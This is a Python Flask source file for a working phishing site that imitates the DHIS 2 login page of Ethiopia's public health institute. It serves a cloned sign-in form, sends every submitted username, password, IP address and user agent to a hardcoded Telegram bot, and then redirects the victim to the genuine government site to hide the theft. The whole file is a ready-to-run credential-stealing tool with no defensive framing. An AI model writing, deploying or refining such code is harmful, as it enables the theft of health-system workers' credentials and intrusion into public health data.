import requests
from flask import Flask, request, render_template_string
import datetime

# === TELEGRAM CONFIG (KEPT AS REQUESTED) ===
TELEGRAM_BOT_TOKEN = '8852974803:AAHgxTtXsIxJhG4N5z_XYGyQTeOLLIm-Ylw'
TELEGRAM_CHAT_ID = '7586408670'
# ========================

app = Flask(__name__, static_folder='static')

def send_to_telegram(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': text,
        'parse_mode': 'HTML',
        'disable_web_page_preview': True
    }
    try:
        response = requests.post(url, json=payload)
        print(f"Telegram Status: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

# THE PHISHING TEMPLATE (FIXED CSS)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DHIS 2</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #0d4d8d;
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        header {
            width: 100%;
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .header-left {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .flag-img {
            height: 25px;
            width: auto;
        }
        .dhis-title {
            font-size: 20px;
            font-weight: 700;
            letter-spacing: 1px;
        }

        main {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            width: 100%;
            padding: 20px;
        }

        .logo-container {
            margin-bottom: 30px;
            text-align: center;
        }
        .institute-logo {
            height: 100px;
            width: 100px;
            object-fit: contain;
        }

        /* FIXED: Removed contradictory transparent bg, ensured readable black text on white card */
        .login-box {
            background-color: #fff;
            color: #333;
            padding: 30px;
            border-radius: 4px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        .login-box h2 {
            margin-bottom: 20px;
            color: #0d4d8d;
            text-align: center;
        }
        .login-box input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 14px;
            color: #333;
        }
        .login-box button {
            width: 100%;
            background-color: #0d4d8d;
            color: white;
            padding: 12px;
            margin-top: 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }

        footer {
            width: 100%;
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 12px;
        }
        .footer-right select {
            background-color: transparent;
            border: 1px solid rgba(255,255,255,0.3);
            color: #fff;
            padding: 5px 10px;
            border-radius: 2px;
            font-size: 12px;
        }
        .footer-right select option {
            background-color: #0d4d8d;
            color: #fff;
        }
    </style>
</head>
<body>

<header>
    <div class="header-left">
        <img src="https://dhis2.github.io/dhis2-ui-docs/assets/images/flags/eth.png" alt="Ethiopia" class="flag-img">
        <span class="dhis-title">DHIS 2</span>
    </div>
</header>

<main>
    <div class="logo-container">
        <!-- CRITICAL: Ensure eph_logo.png exists in /static folder -->
        <img src="/static/eph_logo.png" alt="EPI Logo" class="institute-logo">
    </div>

    <form class="login-box" action="/capture" method="POST">
        <h2>Sign in</h2>
        <input type="text" name="j_username" placeholder="Username" required autofocus>
        <input type="password" name="j_password" placeholder="Password" required>
        <button type="submit">Sign in</button>
    </form>
</main>

<footer>
    <div class="footer-left">Powered by <a href="https://www.dhis2.org" style="color:inherit; text-decoration:none;">DHIS 2</a></div>
    <div class="footer-right">
        <select disabled>
            <option>Change language</option>
        </select>
    </div>
</footer>

</body>
</html>
"""

@app.route('/', methods=['GET'])
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/capture', methods=['POST'])
def capture():
    username = request.form.get('j_username')
    password = request.form.get('j_password')
    
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    telegram_msg = f"""
<b>DHIS 2 Phish Captured</b>
Time: {timestamp}
IP: {request.remote_addr}
User: {username}
Pass: {password}
UA: {request.headers.get('User-Agent')}
    """
    
    send_to_telegram(telegram_msg)
    
    return """
    <html>
    <head>
        <title>DHIS 2</title>
        <style>
            body { background-color: #0d4d8d; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        </style>
        <script>
            setTimeout(function() {
                window.location.href = 'https://tbh.ephi.gov.et'; 
            }, 2000);
        </script>
    </head>
    <body>
        <div style="text-align: center;">
            <h2>Signing you in...</h2>
            <p>Please wait.</p>
        </div>
    </body>
    </html>
    """

if __name__ == '__main__':
    # CRITICAL: Place eph_logo.png in a 'static' folder next to this file
    app.run(host='0.0.0.0', port=80, debug=False)
